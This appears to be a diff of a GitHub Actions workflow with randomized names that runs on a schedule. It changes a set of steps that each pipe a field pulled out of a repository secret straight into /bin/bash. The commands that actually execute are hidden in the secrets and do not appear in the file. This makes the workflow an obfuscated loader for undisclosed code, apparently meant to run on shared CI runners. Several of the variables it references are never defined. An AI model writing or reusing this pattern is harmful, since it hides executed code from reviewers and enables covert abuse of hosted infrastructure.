@@ -1,22 +1,22 @@
 name: longaodi2374
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 * * * *'
-
-jobs:  # 25434
+    - cron: '2 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: longaodi2374
         env:
-          tpd03: ${{ secrets.tpd03 }}
+          rpmwa9913: ${{ secrets.rpmwa9913 }}
         run: |
-          echo $tpd03 | jq -r .vmx39 | /bin/bash
-          echo $pnuc39 | jq -r .gz15 | /bin/bash
-          echo $ogp77861 | jq -r .nzmv3556 | /bin/bash
-          echo $iox16 | jq -r .evtb551 | /bin/bash
+          echo $rpmwa9913 | jq -r .tzy93059 | /bin/bash
+          echo $i5 | jq -r .qjfn995 | /bin/bash
+          echo $a43 | jq -r .wffr564 | /bin/bash
+          echo $hrxhr152 | jq -r .fw91 | /bin/bash
+          echo $xq30 | jq -r .er90 | /bin/bash
+          echo $yrry9268 | jq -r .w2 | /bin/bash
+          echo $avfj0871 | jq -r .kla4799 | /bin/bash
 
